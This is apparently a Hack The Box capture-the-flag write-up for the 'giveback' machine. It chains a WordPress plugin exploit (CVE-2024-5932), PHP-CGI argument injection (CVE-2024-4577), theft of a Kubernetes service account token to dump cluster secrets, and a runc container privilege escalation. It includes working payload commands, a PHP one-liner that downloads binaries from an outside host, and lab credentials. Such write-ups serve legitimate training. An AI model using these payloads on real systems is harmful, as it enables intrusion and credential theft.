## Flags

1. **User Flag**: `ada8bd3d012dbe15ed3386954253d0b0`
2. **Root Flag**: `9bc4124f15128b713d7b80d4b5d03736`

---

## Enumeration

### 1. General Information

- **Operating System**: Linux
- **Discovered Credentials / Users**:
  - `mariadb` → `bn_wordpress` : `sW5sp4spa3u7RLyetrekE4oS`
  - `mariadb-root` → `root` : `sW5sp4syetre32828383kE4oSI`
  - `babywyrm` : `qPM6pt6fH7j5PTeHBSSfRC3rMpHMK4BH`

---
### 2. Open Ports

| Port | Service | Version |
|-----:|--------|---------|
| 22/tcp | SSH | OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 |
| 80/tcp | HTTP | nginx 1.28.0 |
| 30686/tcp | HTTP | Golang net/http server |

---

### 3. Port 80 – HTTP (WordPress)

- Running **WordPress 6.8.1**
- Web server: **nginx 1.28.0**
- `giveback.htb` discovered in source code
- Identified vulnerability: **CVE-2024-5932**

---

## Exploitation

### 1. WordPress (Port 80)

- Used a public PoC for **CVE-2024-5932**  
  https://github.com/autom4il/CVE-2024-5932/blob/main/CVE-2024-5932.py

- Gained access to the **WordPress container**
- Inspected `wp-config.php`:
  - Username: `bn_wordpress`
  - Password: `sW5sp4spa3u7RLyetrekE4oS`
  - DB Host: `beta-vino-wp-mariadb:3306`

- Discovered a **Secrets** directory containing:
  - WordPress secret: `O8F7KR5zGi`

- Database enumeration revealed:
  - User: `babywyrm:$P$Bm1D6gJHKylnyyTeT0oYNGKpib//vP.`
  - Hash could not be cracked

- Environment variable found:
  ```
  LEGACY_INTRANET_SERVICE_PORT_5000_TCP=tcp://10.43.2.241:5000
  ```

---

### 2. File Transfer via PHP

Used PHP to download binaries inside the container:

```bash
php -r 'file_put_contents("/tmp/<Name>", fopen("http://<Ip>:<Port>/<File>","r"));'
```

- Transferred **chisel**
- Established a tunnel to access:
  ```
  http://10.43.2.241:5000
  ```

---

### 3. PHP-CGI Exploitation (Port 5000)

- Exposed **PHP-CGI**
- PHP version disclosed: **8.3.3**
- Vulnerability identified: **CVE-2024-4577**
- Successful payload:

```bash
proxychains4 -q curl -s -d 'echo ""; <Command>' 'http://10.43.2.241:5000/cgi-bin/php-cgi?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input'
```

---

### 4. Kubernetes Secrets Extraction

- Located service account secrets at:
  ```
  /run/secrets/kubernetes.io/serviceaccount/
  ```


- Dumped Kubernetes secrets:
	```bash
proxychains4 -q curl -s 'http://10.43.2.241:5000/cgi-bin/php-cgi?%ADd+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input' -d 'echo ""; curl -sSk -H "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token)" --cacert /run/secrets/kubernetes.io/serviceaccount/ca.crt https://kubernetes.default.svc/api/v1/namespaces/default/secrets' > output_secrets
	```

- Found Base64-encoded password for `babywyrm`:
  ```
  cVBNNnB0NmZIN2o1UFRlSEJTU2ZSQzNyTXBITUs0Qkg=
  ```

- Decoded value:
  ```
  qPM6pt6fH7j5PTeHBSSfRC3rMpHMK4BH
  ```

- Successfully logged in via **SSH**

---

## User Access

- Retrieved user flag: `ada8bd3d012dbe15ed3386954253d0b0`
- `sudo -l` revealed permission to run:
	  ```bash
  /opt/debug
	  ```
- Required an additional administrative password
- Using the **MariaDB normal password**, access was granted
- `/opt/debug` identified as a **wrapper around runc**

---

## Privilege Escalation – Root

### runc Container Configuration

Created `config.json`:

```json
{
  "ociVersion": "1.0.2",
  "process": {
    "terminal": false,
    "user": { "uid": 0, "gid": 0 },
    "args": ["/bin/sh"],
    "env": ["PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin"],
    "cwd": "/"
  },
  "root": { "path": "rootfs", "readonly": false },
  "hostname": "runc-root",
  "mounts": [
    {"destination": "/proc", "type": "proc", "source": "proc"},
    {"destination": "/bin", "type": "bind", "source": "/bin", "options": ["bind"]},
    {"destination": "/lib", "type": "bind", "source": "/lib", "options": ["bind"]},
    {"destination": "/lib64", "type": "bind", "source": "/lib64", "options": ["bind"]},
    {"destination": "/root/file", "type": "bind", "source": "/root/root.txt", "options": ["bind"]}
  ],
  "linux": {
    "namespaces": [
      {"type": "pid"},
      {"type": "ipc"},
      {"type": "uts"},
      {"type": "mount"},
      {"type": "network"}
    ]
  }
}
```

### Execution

```bash
mkdir rootfs
sudo /opt/debug run readFlag
```

- Successfully retrieved root flag
- Total time invested: **12+ hours**

> The price to pay for knowledge, Alhamdulillah!
---
